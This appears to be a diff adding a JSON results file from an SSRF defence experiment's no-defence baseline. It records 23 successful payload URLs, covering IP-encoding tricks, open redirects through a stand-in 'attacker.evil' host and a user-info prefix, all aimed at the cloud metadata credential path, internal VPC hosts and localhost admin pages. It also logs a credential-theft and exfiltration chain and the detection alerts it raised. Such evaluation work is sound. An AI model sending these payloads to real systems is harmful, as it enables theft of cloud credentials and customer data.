@@ -1,0 +1,364 @@
+{
+  "config": "C0",
+  "name": "Baseline (no defences)",
+  "settings": {
+    "imds": "optional",
+    "guard": "off",
+    "iam": "overprivileged"
+  },
+  "payloads": [
+    {
+      "id": "M01",
+      "category": "metadata",
+      "technique": "Direct link-local IP",
+      "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "M02",
+      "category": "metadata",
+      "technique": "DNS alias (instance-data)",
+      "url": "http://instance-data.ec2.internal/latest/meta-data/iam/security-credentials/webapp-role",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "M03",
+      "category": "metadata",
+      "technique": "Decimal IP encoding",
+      "url": "http://2852039166/latest/meta-data/iam/security-credentials/webapp-role",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "M04",
+      "category": "metadata",
+      "technique": "Hexadecimal IP encoding",
+      "url": "http://0xa9fea9fe/latest/meta-data/iam/security-credentials/webapp-role",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "M05",
+      "category": "metadata",
+      "technique": "Octal IP encoding",
+      "url": "http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/webapp-role",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "M06",
+      "category": "metadata",
+      "technique": "Short-form IP (169.254.43518)",
+      "url": "http://169.254.43518/latest/meta-data/iam/security-credentials/webapp-role",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "M07",
+      "category": "metadata",
+      "technique": "IPv4-mapped IPv6",
+      "url": "http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/webapp-role",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "M08",
+      "category": "metadata",
+      "technique": "Explicit port :80",
+      "url": "http://169.254.169.254:80/latest/meta-data/iam/security-credentials/webapp-role",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "M09",
+      "category": "metadata",
+      "technique": "User-info prefix (trusted@)",
+      "url": "http://cdn.example.net@169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "M10",
+      "category": "metadata",
+      "technique": "Upper-case scheme",
+      "url": "HTTP://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "M11",
+      "category": "metadata",
+      "technique": "Open redirect 302",
+      "url": "http://attacker.evil/redirect?to=http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "M12",
+      "category": "metadata",
+      "technique": "Open redirect 307 + decimal IP",
+      "url": "http://attacker.evil/redirect?to=http://2852039166/latest/meta-data/iam/security-credentials/webapp-role&code=307",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "M13",
+      "category": "metadata",
+      "technique": "Metadata index listing",
+      "url": "http://169.254.169.254/latest/meta-data/",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "M14",
+      "category": "metadata",
+      "technique": "Instance identity (hostname)",
+      "url": "http://169.254.169.254/latest/meta-data/hostname",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "V01",
+      "category": "internal-vpc",
+      "technique": "Direct private IP",
+      "url": "http://10.0.1.20/",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "V02",
+      "category": "internal-vpc",
+      "technique": "Internal DNS name",
+      "url": "http://internal-api.vpc.local/employees",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "V03",
+      "category": "internal-vpc",
+      "technique": "Decimal IP encoding",
+      "url": "http://167772436/",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "V04",
+      "category": "internal-vpc",
+      "technique": "Open redirect 302",
+      "url": "http://attacker.evil/redirect?to=http://10.0.1.20/payroll",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "L01",
+      "category": "localhost",
+      "technique": "127.0.0.1",
+      "url": "http://127.0.0.1/admin/debug",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "L02",
+      "category": "localhost",
+      "technique": "localhost name",
+      "url": "http://localhost/admin/debug",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "L03",
+      "category": "localhost",
+      "technique": "0.0.0.0",
+      "url": "http://0.0.0.0/admin/debug",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "L04",
+      "category": "localhost",
+      "technique": "Short-form 127.1",
+      "url": "http://127.1/admin/debug",
+      "outcome": "success",
+      "reason": 200
+    },
+    {
+      "id": "L05",
+      "category": "localhost",
+      "technique": "Open redirect 302",
+      "url": "http://attacker.evil/redirect?to=http://127.0.0.1/admin/debug",
+      "outcome": "success",
+      "reason": 200
+    }
+  ],
+  "payload_success": {
+    "total": 23,
+    "success": 23,
+    "by_category": {
+      "metadata": [
+        14,
+        14
+      ],
+      "internal-vpc": [
+        4,
+        4
+      ],
+      "localhost": [
+        5,
+        5
+      ]
+    }
+  },
+  "chain": {
+    "ssrf_reached_metadata": true,
+    "credentials_stolen": true,
+    "stolen_key": "ASIA************BBPI",
+    "list_buckets": [
+      "app-uploads",
+      "customer-data"
+    ],
+    "read_customer_data": "allowed",
+    "records_exfiltrated": 1000
+  },
+  "legit": {
+    "requests": 100,
+    "ok": 100,
+    "false_positive_ids": [],
+    "latency_ms": {
+      "mean": 2.53,
+      "median": 2.38,
+      "p95": 4.05,
+      "samples": [
+        2.63,
+        2.51,
+        2.39,
+        2.69,
+        2.46,
+        4.06,
+        1.98,
+        2.36,
+        2.47,
+        2.41,
+        2.31,
+        2.19,
+        2.67,
+        2.43,
+        2.25,
+        3.83,
+        2.04,
+        2.33,
+        2.36,
+        2.36,
+        2.39,
+        2.26,
+        2.31,
+        2.36,
+        2.43,
+        4.26,
+        1.88,
+        2.4,
+        2.16,
+        2.42,
+        2.39,
+        2.41,
+        2.25,
+        2.38,
+        2.36,
+        3.92,
+        1.91,
+        2.28,
+        2.26,
+        2.45,
+        2.5,
+        2.38,
+        2.38,
+        2.41,
+        2.36,
+        4.15,
+        2.13,
+        2.33,
+        2.34,
+        2.47,
+        2.49,
+        2.45,
+        2.62,
+        2.36,
+        2.31,
+        4.37,
+        2.06,
+        2.23,
+        2.39,
+        3.35,
+        2.29,
+        2.27,
+        2.34,
+        2.39,
+        2.29,
+        3.92,
+        2.01,
+        2.4,
+        2.46,
+        2.38,
+        2.27,
+        2.35,
+        2.54,
+        2.22,
+        2.83,
+        4.25,
+        2.0,
+        2.42,
+        2.29,
+        2.26,
+        2.45,
+        2.38,
+        2.54,
+        2.28,
+        2.62,
+        3.83,
+        1.85,
+        2.23,
+        2.24,
+        2.5,
+        2.36,
+        2.48,
+        2.53,
+        2.27,
+        2.46,
+        4.05,
+        2.18,
+        2.75,
+        2.34,
+        2.38
+      ]
+    },
+    "s3_save_ok": 5,
+    "s3_save_total": 5,
+    "s3_save_errors": []
+  },
+  "detection": {
+    "alerts": 2,
+    "sample": [
+      {
+        "time": "2026-11-20T17:06:29Z",
+        "finding": "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration",
+        "severity": "HIGH",
+        "access_key": "ASIA************BBPI",
+        "expected_source": "203.0.113.10",
+        "actual_source": "203.0.113.100",
+        "api_call": "GET /",
+        "http_status": 200
+      },
+      {
+        "time": "2026-11-20T17:06:29Z",
+        "finding": "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration",
+        "severity": "HIGH",
+        "access_key": "ASIA************BBPI",
+        "expected_source": "203.0.113.10",
+        "actual_source": "203.0.113.100",
+        "api_call": "GET /customer-data/exports/customers.csv",
+        "http_status": 200
+      }
+    ]
+  }
+}
